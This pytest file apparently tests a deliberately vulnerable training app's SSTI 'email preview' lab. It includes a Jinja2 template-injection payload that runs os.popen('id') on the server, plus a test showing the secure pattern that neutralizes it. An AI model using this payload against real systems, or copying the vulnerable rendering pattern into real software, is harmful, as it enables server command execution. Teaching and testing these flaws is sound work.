def test_email_preview_renders_legitimate_greeting(client):
    response = client.post(
        "/a03/email-preview",
        data={"greeting_template": "Hi there, thanks for signing up!"},
    )
    assert response.status_code == 200
    assert b"Hi there, thanks for signing up!" in response.data


def test_email_preview_detect_probe_evaluates_expression(client):
    response = client.post("/a03/email-preview", data={"greeting_template": "{{ 7*7 }}"})
    assert response.status_code == 200
    assert b"49" in response.data


def test_email_preview_ssti_achieves_real_command_execution(client):
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    response = client.post("/a03/email-preview", data={"greeting_template": payload})
    assert response.status_code == 200
    assert b"uid=" in response.data


def test_email_preview_secure_pattern_neutralizes_ssti_payload():
    import html

    from flask import Flask, render_template_string

    app = Flask(__name__)
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    with app.app_context(), app.test_request_context():
        result = render_template_string(
            "Hi {{ name }}, thanks for signing up!", name=payload
        )
    assert "uid=" not in result
    # Flask's default Jinja env autoescapes render_template_string() output
    # (filename=None -> autoescape True), so the payload's single quotes come
    # back as HTML entities (&#39;) rather than raw characters. Unescape
    # before comparing -- the point being proven is that the payload survives
    # as literal, non-evaluated text, not that autoescaping is disabled.
    assert payload in html.unescape(result)


def test_email_preview_static_teaching_text_shows_literal_braces_not_evaluated(client):
    response = client.get("/a03/email-preview")
    assert response.status_code == 200
    body = response.data.decode()
    assert "{{ 7*7 }}" in body
    assert "49" not in body


def test_email_preview_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/email-preview", data={"greeting_template": "Hi there!"}
    )
    assert response.status_code == 200
    assert b"Hi there!" in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data


def test_email_preview_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"SSTI" in response.data
    assert b'href="/a03/email-preview"' in response.data
